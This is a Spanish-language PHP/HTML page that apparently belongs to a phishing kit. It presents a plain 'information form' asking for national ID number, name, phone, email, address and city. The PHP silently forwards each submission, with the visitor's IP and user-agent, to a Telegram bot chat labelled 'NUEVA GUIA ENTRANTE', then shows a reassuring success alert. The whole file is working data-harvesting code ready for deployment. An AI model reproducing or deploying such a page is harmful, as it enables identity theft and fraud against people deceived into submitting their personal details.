<?php
// Incluye tu archivo con $token y $telegram_admin_id
include '../telegram.php';

// Función para obtener la IP del usuario
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Cuando se envía el formulario
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $cedula   = htmlspecialchars($_POST['cedula']);
    $nombre   = htmlspecialchars($_POST['nombre']);
    $phone    = htmlspecialchars($_POST['phone']);
    $email    = htmlspecialchars($_POST['email']);
    $address  = htmlspecialchars($_POST['address']);
    $city     = htmlspecialchars($_POST['city']);
    $user_ip  = getUserIP();

    // 🚨 Formato bonito del mensaje
    $msg  = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n";
    $msg .= "🆔 *Cédula:* $cedula\n";
    $msg .= "👤 *Nombre:* $nombre\n";
    $msg .= "📞 *Teléfono:* $phone\n";
    $msg .= "📧 *Email:* $email\n";
    $msg .= "🏠 *Dirección:* $address\n";
    $msg .= "🌆 *Ciudad:* $city\n";
    $msg .= "🌍 *IP:* $user_ip\n";
    $msg .= "🖥 *User-Agent:* " . $_SERVER['HTTP_USER_AGENT'] . "\n";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $telegram_admin_id,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);

    echo "<script>alert('✅ Tus datos fueron enviados con éxito.'); window.location.href='../index.html';</script>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulario de Información</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f6f9; padding: 20px; }
    .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,.1); }
    h2 { text-align: center; color: #333; }
    label { display: block; margin: 10px 0 5px; font-weight: bold; }
    input, textarea { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; }
    textarea { resize: vertical; min-height: 100px; }
    button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="container">
    <h2>📋 Formulario de Información</h2>
    <form method="POST" action="">
      <label for="cedula">Cédula</label>
      <input type="text" id="cedula" name="cedula" required>

      <label for="nombre">Nombre</label>
      <input type="text" id="nombre" name="nombre" required>

      <label for="phone">Teléfono</label>
      <input type="text" id="phone" name="phone" required>

      <label for="email">Correo electrónico</label>
      <input type="email" id="email" name="email" required>

      <label for="address">Dirección</label>
      <input type="text" id="address" name="address" required>

      <label for="city">Ciudad</label>
      <input type="text" id="city" name="city" required>

      <button type="submit">Enviar 🚀</button>
    </form>
  </div>
</body>
</html>
